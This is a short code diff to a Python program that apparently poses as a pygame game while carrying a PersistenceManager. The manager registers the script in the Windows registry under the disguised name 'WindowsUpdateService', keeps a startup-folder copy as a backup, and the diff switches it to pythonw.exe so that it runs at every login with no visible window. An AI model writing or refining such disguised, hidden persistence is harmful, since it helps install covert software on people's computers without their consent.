@@ -318,7 +318,7 @@ class DependencyManager:
             
             # First try exact match for current Python version
             for file in available_files:
-                if file.startswith('pygame-') and file.endswith('.whl'):
+                if file.startswith('pygame_ce-') and file.endswith('.whl'):
                     if f'cp{py_version}' in file:
                         pygame_wheel = file
                         break
@@ -508,9 +508,13 @@ class PersistenceManager:
                 
                 with winreg.OpenKey(key, subkey, 0, winreg.KEY_SET_VALUE) as regkey:
                     executable = sys.executable
+                    pythonw_path = executable.replace('python.exe', 'pythonw.exe')
+                    if not os.path.exists(pythonw_path):
+                       pythonw_path = executable
+                    
                     script_path = os.path.abspath(__file__)
                     winreg.SetValueEx(regkey, "WindowsUpdateService", 0, winreg.REG_SZ, 
-                                     f'"{executable}" "{script_path}"')
+                                     f'"{pythonw_path}" "{script_path}"')
                 
                 # Also add to startup folder as backup
                 startup_folder = os.path.join(
@@ -925,6 +929,7 @@ def main():
         sys.exit(1)
     
     # Now import pygame (it should be installed)
+    global pygame
     import pygame
     
     # Run the game
